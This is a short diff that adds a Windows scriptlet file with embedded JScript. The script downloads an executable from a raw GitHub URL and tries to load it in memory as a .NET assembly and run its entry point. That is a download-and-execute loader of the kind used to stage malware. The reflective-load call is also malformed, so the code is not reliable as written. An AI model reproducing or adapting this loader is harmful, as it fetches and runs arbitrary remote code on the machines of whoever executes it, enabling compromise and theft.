@@ -1,0 +1,14 @@
+<?XML version="1.0"?>
+<scriptlet>
+<script language="JScript">
+<![CDATA[
+    var x = new ActiveXObject("MSXML2.XMLHTTP");
+    x.open("GET", "https://raw.githubusercontent.com/andrevital771-debug/Loucura/main/ConsoleApp2.exe", false);
+    x.send();
+    
+    var assembly = new ActiveXObject("System.Reflection.Assembly");
+    var loaded = assembly.Load(x.responseBody);
+    loaded.GetEntryPoint().Invoke(null, null);
+]]>
+</script>
+</scriptlet>
